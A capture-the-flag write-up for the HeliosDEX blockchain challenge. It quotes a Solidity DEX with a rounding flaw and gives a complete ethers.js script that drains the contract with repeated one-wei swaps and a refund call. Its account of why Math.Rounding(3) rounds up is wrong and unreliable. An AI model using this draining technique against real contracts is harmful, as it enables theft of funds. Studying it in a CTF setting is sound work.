---
layout: load_md
title: The White Circle | Cyber Apocalypse 2025 | HeliosDEX Writeup
desc: Check out our writeup for HeliosDEX for Cyber Apocalypse 2025 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2025
parent: cyber_apocalypse_2025
category: blockchain
challenge: HeliosDEX
tags: "blockchain, starry, solidity"
date: 2025-03-29T00:00:00+00:00
last_modified_at: 2025-03-29T00:00:00+00:00
---


> Solved by Starry-Lord

We have a `Setup.sol` and a HeliosDEX.sol to review. In HeliosDEX.sol this flaw was found:


    function swapForELD() external payable underHeliosEye {
            uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0));
            uint256 fee = (grossELD * feeBps) / 10_000;
            uint256 netELD = grossELD - fee;
    
            require(netELD <= reserveELD, "HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
    
            reserveELD -= netELD;
            eldorionFang.transfer(msg.sender, netELD);
    
            emit HeliosBarter(address(eldorionFang), msg.value, netELD);
        }
    
        function swapForMAL() external payable underHeliosEye {
            uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
            uint256 fee = (grossMal * feeBps) / 10_000;
            uint256 netMal = grossMal - fee;
    
            require(netMal <= reserveMAL, "HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
    
            reserveMAL -= netMal;
            malakarEssence.transfer(msg.sender, netMal);
    
            emit HeliosBarter(address(malakarEssence), msg.value, netMal);
        }
    
        function swapForHLS() external payable underHeliosEye {
            uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3)); <----- That's the issue here
            uint256 fee = (grossHLS * feeBps) / 10_000;
            uint256 netHLS = grossHLS - fee;
            
            require(netHLS <= reserveHLS, "HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
            
    
            reserveHLS -= netHLS;
            heliosLuminaShards.transfer(msg.sender, netHLS);
    
            emit HeliosBarter(address(heliosLuminaShards), msg.value, netHLS);
        }

According to OpenZeppelin’s documentation for the Math Library:


    enum Rounding {
        Down, // Toward negative infinity --> Math.Rounding(0)
        Up, // Toward infinity --> Math.Rounding(1)
        Zero // Toward zero --> Math.Rounding(2)
    }

This means Math.Rounding(3) will cause unexpected behaviors, here are the key points:
Since `3` isn't defined, the compiler treats it as an undefined value, falling back to default rounding behavior which is **Up** [**🎉🎉🎉**](https://emojipedia.org/party-popper)

This rounding made me rich after 250 swaps! Just had to make sure to only swap 1 Wei each time and call the refund function once only, as per the contracts.


![](https://i.imgur.com/Kjig6bi.png)



`drain.js script`


    const { ethers } = require("ethers");
    
    // Your setup info
    const RPC_URL = "http://94.237.57.122:59310";
    const PLAYER_PRIVATE_KEY = "0xc355db294444232fe7a8e308550e87f2f79c617b7f04541d2f44348235dbf133";
    const PLAYER_ADDRESS = "0xF44279bF0072cd7BD98F4b994d3E7ad7ed15Cd45";
    
    // Contracts
    const SETUP_ADDRESS = "0xD05A41b677783bAB39B68499F8f11f8066A61545";
    
    const SETUP_ABI = [
      "function isSolved() public view returns (bool)",
      "function TARGET() public view returns (address)"
    ];
    
    const HELIOS_DEX_ABI = [
      "function swapForHLS() external payable",
      "function oneTimeRefund(address item, uint256 amount) external",
      "function heliosLuminaShards() external view returns (address)",
      "function hasRefunded(address user) external view returns (bool)"
    ];
    
    const ERC20_ABI = [
      "function approve(address spender, uint256 amount) external returns (bool)",
      "function balanceOf(address account) external view returns (uint256)"
    ];
    
    async function main() {
      const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
      const wallet = new ethers.Wallet(PLAYER_PRIVATE_KEY, provider);
    
      const setupContract = new ethers.Contract(SETUP_ADDRESS, SETUP_ABI, wallet);
      const targetAddress = await setupContract.TARGET();
      const dex = new ethers.Contract(targetAddress, HELIOS_DEX_ABI, wallet);
    
      const hlsAddress = await dex.heliosLuminaShards();
      const hlsToken = new ethers.Contract(hlsAddress, ERC20_ABI, wallet);
    
      console.log(`Connected to HeliosDEX at: ${targetAddress}`);
    
      // Exploit: repeatedly swap very small ETH amounts to get HLS due to faulty rounding
      const exploitValue = ethers.utils.parseUnits("1", "wei"); // smallest possible ETH amount
      const iterations = 250; // Do multiple swaps to accumulate tokens efficiently
    
      console.log(`Starting exploit with ${iterations} swaps of 1 wei each...`);
      for (let i = 0; i < iterations; i++) {
        const txSwap = await dex.swapForHLS({ value: exploitValue });
        await txSwap.wait();
        console.log(`Swap #${i + 1} completed.`);
      }
    
      // Check accumulated HLS balance
      const hlsBalance = await hlsToken.balanceOf(PLAYER_ADDRESS);
      console.log(`Accumulated HLS balance: ${ethers.utils.formatUnits(hlsBalance, 18)} HLS`);
    
      // Approve the DEX to spend tokens
      const approveTx = await hlsToken.approve(targetAddress, hlsBalance);
      await approveTx.wait();
      console.log("Approved DEX to spend HLS tokens.");
    
      // Perform refund once to gain ETH
      const hasRefunded = await dex.hasRefunded(PLAYER_ADDRESS);
      if (!hasRefunded) {
        const refundTx = await dex.oneTimeRefund(hlsAddress, hlsBalance, { gasLimit: 1000000 });
        await refundTx.wait();
        console.log("Refund executed successfully.");
      } else {
        console.log("Refund already executed previously.");
      }
    
      const playerBalance = await provider.getBalance(PLAYER_ADDRESS);
      console.log(`Final player's ETH balance: ${ethers.utils.formatEther(playerBalance)} ETH`);
    
      const solved = await setupContract.isSolved();
      if (solved) {
        console.log("Challenge Solved! Player has 20 ETH or more.");
      } else {
        console.log("Not solved yet, consider increasing iterations.");
      }
    }
    
    main().catch((error) => {
      console.error("Error during exploit execution:", error);
    });
    


